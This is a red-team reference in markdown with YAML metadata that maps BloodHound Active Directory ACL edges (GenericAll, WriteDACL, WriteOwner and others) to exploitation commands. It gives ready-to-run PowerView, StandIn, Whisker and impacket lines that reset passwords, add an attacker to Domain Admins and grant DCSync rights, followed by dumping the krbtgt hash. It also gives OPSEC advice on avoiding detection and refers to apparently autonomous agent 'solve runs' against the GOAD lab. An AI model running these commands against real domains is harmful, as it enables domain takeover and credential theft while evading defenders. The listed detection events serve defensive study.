---
name: ACL Abuse Chain Reference
category: acl-abuse
subcategories: [genericall, genericwrite, writedacl, addself, forcechangepassword]
tradecraft_tags: [acl, genericall, genericwrite, writedacl, ownership, technique, chain]
mitre_attack:
  - id: T1222.001
    name: File and Directory Permissions Modification — Windows File and Directory Permissions Modification
  - id: T1098
    name: Account Manipulation
source:
  url: https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html
  license: none
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  ACL abuse operations generate Event 5136 (Object Modification) when AD object attributes
  are changed. Group membership changes generate Event 4728/4732 (member added). ACL
  changes themselves generate Event 4670 (Permissions on an object were changed). MDI
  detects many ACL abuse patterns. PowerView's Add-DomainObjectAcl is more detectable
  than targeted native LDAP calls.
usage_examples:
  - description: GenericAll on User — reset password (no cracking needed)
    args: "Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssNew1!' -AsPlainText -Force)"
  - description: GenericAll on Group — add self to group
    args: "Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker"
  - description: GenericWrite on User — add SPN for targeted kerberoast (then use cert/delegation path)
    args: "Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}"
  - description: WriteDACL on Object — grant self GenericAll, then act
    args: "Add-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity attacker -Rights All"
  - description: WriteOwner — take ownership, then WriteDACL → GenericAll
    args: "Set-DomainObjectOwner -Identity targetobject -OwnerIdentity attacker"
  - description: ForceChangePassword on User
    args: "Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssNew1!' -AsPlainText -Force)"
  - description: GenericWrite on Computer — add to shadow credentials or set SPN
    args: "Whisker.exe add /target:VICTIM$"
opsec_notes: |
  Password resets (ForceChangePassword) are very noisy — the user will immediately notice.
  Prefer shadow credentials (Whisker) or SPN-addition (for non-cracking paths) over
  password resets when GenericWrite is present. Group membership additions (GenericAll
  on group) generate Event 4732 — immediate detection signal for security-monitored groups
  (Domain Admins). WriteDACL + self-grant is a two-step operation that generates two 5136
  events. WriteOwner + subsequent DACL change is similarly double-event.
gotchas: |
  ACL changes are persistent — if you add yourself to Domain Admins or reset a password,
  that change stays until manually reversed. This is high-impact, reversible, but immediately
  visible to defenders and the target user. Always clean up ACL changes. Shadow credentials
  (Whisker) and SPN manipulation are less disruptive than password resets. For GenericWrite
  on a computer, Whisker is the preferred path over password reset (which would break
  computer domain membership).
related_ttps: [whisker, standin, sharpgpoabuse, powerview, rubeus, certify]
alternatives: []
common_args: {}
last_updated: 2026-05-29
---

# ACL Abuse Chain Reference

A reference for translating BloodHound ACL edges into concrete exploitation operations.
When SharpHound/BloodHound identifies a controlled principal with specific ACL rights over
a target, this document maps the edge type to the appropriate exploitation technique.

## ACL Edge to Exploitation Mapping

| BloodHound Edge | Target Type | Exploitation Path | Primary Tool |
|----------------|-------------|------------------|--------------|
| `GenericAll` | User | Whisker (shadow cred) OR password reset | Whisker preferred |
| `GenericAll` | Group | Add self/member to group over LDAP | **StandIn** `--group --ntaccount --add` (non-PS, Apollo inline-assembly) · impacket-dacledit (Linux/ticket) · PowerView only if already loaded |
| `GenericAll` | Computer | Whisker (shadow cred) OR RBCD via StandIn | Whisker preferred |
| `GenericAll` | GPO | Modify GPO for code exec / local admin | SharpGPOAbuse |
| `GenericWrite` | User | Whisker (shadow cred) OR SPN set for delegation | Whisker preferred |
| `GenericWrite` | Computer | Whisker (shadow cred) OR msDS-AllowedToDelegateTo | Whisker preferred |
| `WriteDACL` | Any | Grant self GenericAll → then act | **impacket-dacledit** / **StandIn** (non-PS) · PowerView Add-DomainObjectAcl only if loaded |
| `WriteOwner` | Any | Take ownership → WriteDACL → GenericAll | **impacket-owneredit** / **StandIn** (non-PS) · PowerView Set-DomainObjectOwner only if loaded |
| `AddSelf` | Group | Add self to group | **StandIn** `--group --ntaccount --add` (non-PS) · Net group · PowerView if loaded |
| `AddMember` | Group | Add any principal to group | **StandIn** `--group --ntaccount --add` (non-PS) · PowerView if loaded |
| `ForceChangePassword` | User | Reset password (NOISY — prefer Whisker) | Set-DomainUserPassword |
| `Owns` | Any | Same as WriteOwner | PowerView |
| `AllExtendedRights` | User | Whisker OR password reset | Whisker preferred |
| `GenericAll`/`WriteDACL`/`WriteOwner` | Domain | Grant self the two DS-Replication extended rights → DCSync | **StandIn** `--object <domain-DN> --grant --guid` (non-PS, both GUIDs) → then `apollo dcsync` / `lsadump::dcsync` · PowerView `Add-DomainObjectAcl -Rights DCSync` only if loaded — see "DCSync via WriteDACL on Domain" below + `ttps/standin.md` |

## Non-PowerShell execution (OPSEC-scoped / inline-assembly only)

When PowerShell is out of scope (autonomous solve runs scoped to in-memory .NET assemblies + BOFs, no
`powershell`/`powershell_import`), PowerView is NOT available — do not route group/ACL writes through it.
Use the non-PowerShell equivalents:

| Operation | Non-PowerShell tool | Syntax |
|-----------|--------------------|--------|
| Add a principal to a group (GenericAll/AddSelf/AddMember on group) | **StandIn** (Apollo inline-assembly) | `StandIn.exe --group "Domain Admins" --ntaccount "DOMAIN\User" --add` — see `ttps/standin.md` |
| Write/modify a DACL (WriteDACL/WriteOwner → grant rights) | **impacket-dacledit** / **StandIn** (Linux foothold w/ ticket, or Apollo) | `dacledit.py -action write -rights FullControl -principal attacker -target-dn <DN> domain/user -k` |
| Read/verify an object's DACL before acting | **SharpObjectACL** (read-only) | `SharpObjectACL.exe -target "<DN>"` |

StandIn is the primary final-hop tool for adding a controlled account to `Domain Admins` over LDAP from
the current Kerberos context — it does not touch PowerShell. SharpObjectACL only *reads* DACLs; it cannot
write — pair it with StandIn/impacket-dacledit for the write.

## Why Whisker Is Usually Preferred

Password reset is irreversible without knowing the old password — the user is immediately
locked out of their account and will notice. Shadow credentials via Whisker:
- Don't change the user's password
- Are invisible to the user
- Can be removed cleanly (`Whisker clear /target:X`)
- Work for both user and computer accounts

**Exception:** If the account is a service account that nobody logs into, password
reset is acceptable and simpler.

## DCSync via WriteDACL on Domain

DCSync requires TWO extended rights on the domain object: `DS-Replication-Get-Changes`
(`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) and `DS-Replication-Get-Changes-All`
(`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`). When you hold `WriteDACL`/`GenericAll`/`WriteOwner` on the
domain head, grant yourself both, then DCSync.

**Read the GetNCChanges error code first:** `0x2105` / **8453 `DS_DRA_ACCESS_DENIED`** = you lack the
replication rights → apply the grant below. `0x20f7` / **8439 `DS_DRA_BAD_DN`** = wrong/invalid naming
context → this is a **targeting** bug (wrong forest/DN/DC), NOT a rights problem; fix the target first
(see per-forest note below). Do not grant rights to "fix" an 8439.

**Non-PowerShell (OPSEC-scoped / autonomous-solve default) — StandIn:**

```
# Grant BOTH replication extended rights on the TARGET FOREST's domain object, then DCSync
StandIn.exe --object "DC=essos,DC=local" --grant "ESSOS\localuser" --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
StandIn.exe --object "DC=essos,DC=local" --grant "ESSOS\localuser" --guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
Apollo:   dcsync /domain:essos.local /user:krbtgt          # target the SAME DC you granted on (meereen),
                                                           # as the granted principal; latency → 8453 if not
```

> **Per-forest targeting (the 8439 / malformed-filter trap).** `--object` is the domain DN of the
> forest you are escalating in, and DCSync must run against **that forest's DC**. In GOAD: ESSOS =
> `DC=essos,DC=local` via **meereen** (`meereen.essos.local`); NORTH = `DC=north,DC=sevenkingdoms,DC=local`
> via **winterfell**; root = `DC=sevenkingdoms,DC=local` via **kingslanding**. Granting essos replication
> rights against winterfell/NORTH (wrong DC + wrong DN) is what produces 8439 and malformed LDAP filters —
> confirm the DN and DC match the target forest before issuing.

**PowerShell (only if PowerView already loaded — NOT for the no-PS autonomous solve):**

```
PowerView: Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
Apollo:    dcsync /domain:X /user:krbtgt
```
